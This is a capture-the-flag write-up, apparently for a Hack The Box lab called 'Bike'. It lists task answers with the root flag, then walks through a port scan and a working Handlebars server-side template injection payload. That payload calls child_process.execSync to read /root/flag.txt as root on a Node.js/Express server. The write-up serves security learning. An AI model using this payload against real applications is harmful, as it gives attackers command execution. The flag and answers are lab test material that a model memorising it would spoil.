# Tasks
- What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high
	- 22, 80
- What software is running the service listening on the http/web port identified in the first question?
	- node.js
- What is the name of the Web Framework according to Wappalyzer?
	- Express
- What is the name of the vulnerability we test for by submitting {{7*7}}?
	- Server Side Template Injection
- What is the templating engine being used within Node.JS?
	- handlebars
- What is the name of the BurpSuite tab used to encode text?
	- Decoder
- In order to send special characters in our payload in an HTTP request, we'll encode the payload. What type of encoding do we use?
	- url
- When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error?
	- require
- What variable is the name of the top-level scope in Node.JS?
	- global
- By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user?
	- root
- Submit root flag
	- 6b258d726d287462d60c103d0142a81c


# Steps
- First, let's start with rustscan
```
rustscan --ulimit 5000 --addresses "10.129.1.70" --top -- -sC -sV
```
- From the results, we see web server via nodejs and a SSH server
```
PORT   STATE SERVICE REASON         VERSION  
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)  
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1  
f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZ  
rqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=  
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)  
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=  
|   256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)  
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR  
80/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)  
| http-methods:    
|_  Supported Methods: GET HEAD POST OPTIONS  
|_http-title:  Bike    
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Visting the website, we are given a field that we can input into and submit
- Using Wappalyzer, we can see that the framework being used is Express.
- The thing about express is that with this, we could possible do an XSS attack through the input or even a SSTI attack since Express is a template engine.
- To test that, we will input {{7 * 7}} and see what happens
- Typing that, we were able to get a parsing error, which means that code is able to be executed from this input
- We'll use the help of Burp Suite, since inputing it directly into the form doesn't work since we need some additional handlebars for it to work
- Here's the final payload
```
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule.require('child_process').execSync('cat
/root/flag.txt');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```
- And this gets us our flag!
```
We will contact you at: e
2
[object Object]
function Function() { [native code] }
2
[object Object]
6b258d726d287462d60c103d0142a81c
```